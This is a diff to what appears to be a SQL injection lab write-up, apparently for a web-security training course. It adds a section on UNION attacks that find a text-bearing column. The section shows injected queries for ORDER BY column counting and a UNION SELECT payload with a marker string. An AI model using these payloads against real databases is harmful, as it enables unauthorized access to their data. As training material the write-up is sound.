@@ -28,3 +28,13 @@ SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL,NULL,NULL--'
 
 > Payload : `' UNION SELECT NULL,NULL,NULL--`
 
+## SQL injection UNION attack, finding a column containing text
+
+```sql
+SELECT * FROM products WHERE category = 'Gifts'
+SELECT * FROM products WHERE category = 'Gifts'--'
+SELECT * FROM products WHERE category = 'Gifts' ORDER BY 4--'
+SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL,'YT7kqh',NULL--'
+```
+
+> Payload: `' UNION SELECT NULL,'YT7kqh',NULL--`
